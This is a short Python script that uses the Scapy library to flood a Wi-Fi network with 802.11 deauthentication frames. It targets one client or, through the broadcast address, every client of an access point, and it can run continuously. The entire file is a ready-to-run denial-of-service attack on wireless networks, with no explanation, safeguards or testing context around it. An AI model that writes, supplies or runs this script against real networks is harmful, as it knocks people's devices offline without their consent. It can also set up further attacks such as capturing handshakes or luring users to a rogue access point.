from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth_attack(iface, ap_mac, client_mac=None, count=100):
    target = client_mac if client_mac else "ff:ff:ff:ff:ff:ff"

    pkt1 = RadioTap() / Dot11(
        type=0, subtype=12,
        addr1=target,
        addr2=ap_mac,
        addr3=ap_mac
    ) / Dot11Deauth(reason=7)

    pkt2 = RadioTap() / Dot11(
        type=0, subtype=12,
        addr1=ap_mac,
        addr2=target,
        addr3=ap_mac
    ) / Dot11Deauth(reason=7)

    label = client_mac if client_mac else "ALL clients (broadcast)"
    loop  = (count == 0)

    print(f"[*] Deauthing: {label}")
    print(f"[*] Target AP: {ap_mac}")
    print(f"[*] Mode: {'Continuous' if loop else f'{count} frames'} | Ctrl+C to stop")

    try:
        sendp(
            [pkt1, pkt2],
            iface=iface,
            count=count if not loop else 0,
            loop=1 if loop else 0,
            inter=0.01,
            verbose=False
        )
        print("[+] Deauth done")
    except KeyboardInterrupt:
        print("\n[*] Deauth stopped")
